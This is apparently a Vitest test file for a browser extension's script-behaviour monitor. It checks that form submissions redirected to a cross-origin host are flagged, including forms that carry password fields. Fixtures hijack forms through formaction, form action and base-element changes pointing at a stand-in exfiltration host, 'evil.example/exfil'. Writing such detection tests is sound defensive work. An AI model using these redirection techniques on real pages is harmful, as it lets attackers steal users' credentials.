// @vitest-environment happy-dom
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  _resetState,
  initJsBehaviorMonitor,
} from "../extension/src/content/js_behavior_monitor";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;

const testFetch = vi.fn().mockResolvedValue(new Response());
const testXhrOpen = vi.fn();
const testXhrSend = vi.fn();
const testBeacon = vi.fn().mockReturnValue(true);

beforeAll(() => {
  window.fetch = testFetch as unknown as typeof window.fetch;
  XMLHttpRequest.prototype.open =
    testXhrOpen as unknown as typeof XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.send =
    testXhrSend as unknown as typeof XMLHttpRequest.prototype.send;
  navigator.sendBeacon = testBeacon as unknown as typeof navigator.sendBeacon;
});

beforeEach(() => {
  testFetch.mockClear();
  testXhrOpen.mockClear();
  testXhrSend.mockClear();
  testBeacon.mockClear();
  _resetState();
  document.body.innerHTML = "";
  document.head.querySelectorAll("base").forEach((base) => base.remove());
});

describe("submitter action baselines", () => {
  it("flags a hostile formaction added to an existing submit control", () => {
    const postSignal = vi.fn<PostSignalFn>();
    document.body.innerHTML = `
      <form action="/safe-endpoint">
        <button type="submit">Continue</button>
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;
    const button = document.querySelector("button") as HTMLButtonElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    button.setAttribute("formaction", "https://evil.example/exfil");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
        destinationOrigin: "https://evil.example",
      })
    );
  });

  it("flags a same-task override on a newly inserted submit control", () => {
    const postSignal = vi.fn<PostSignalFn>();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "/safe-endpoint";
    const button = document.createElement("button");
    button.type = "submit";
    form.appendChild(button);
    document.body.appendChild(form);

    button.setAttribute("formaction", "https://evil.example/exfil");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
        destinationOrigin: "https://evil.example",
      })
    );
  });

  it("resolves a whitespace-only submitter action against the document base", () => {
    const postSignal = vi.fn<PostSignalFn>();
    const base = document.createElement("base");
    base.href = "https://evil.example/base/";
    document.head.appendChild(base);
    document.body.innerHTML = `
      <form action="/safe-endpoint">
        <input type="password" value="not-observed">
        <button type="submit" formaction="   ">Continue</button>
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;
    const button = document.querySelector("button") as HTMLButtonElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: false,
        hasCredentialFields: true,
        isCrossOrigin: true,
        destinationOrigin: "https://evil.example",
      })
    );
  });

  it("flags removal of a same-origin override that exposes a cross-origin form action", () => {
    const postSignal = vi.fn<PostSignalFn>();
    document.body.innerHTML = `
      <form action="https://evil.example/exfil">
        <button type="submit" formaction="/safe-endpoint">Continue</button>
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;
    const button = document.querySelector("button") as HTMLButtonElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    button.removeAttribute("formaction");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
        isCrossOrigin: true,
        destinationOrigin: "https://evil.example",
      })
    );
  });

  it("does not flag removing an override when the inherited form destination is unchanged", () => {
    const postSignal = vi.fn<PostSignalFn>();
    document.body.innerHTML = `
      <form action="https://same.example/submit">
        <button type="submit" formaction="https://same.example/submit">Continue</button>
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;
    const button = document.querySelector("button") as HTMLButtonElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    button.removeAttribute("formaction");
    form.dispatchEvent(
      new SubmitEvent("submit", { bubbles: true, submitter: button })
    );

    expect(postSignal).not.toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.anything()
    );
  });
});
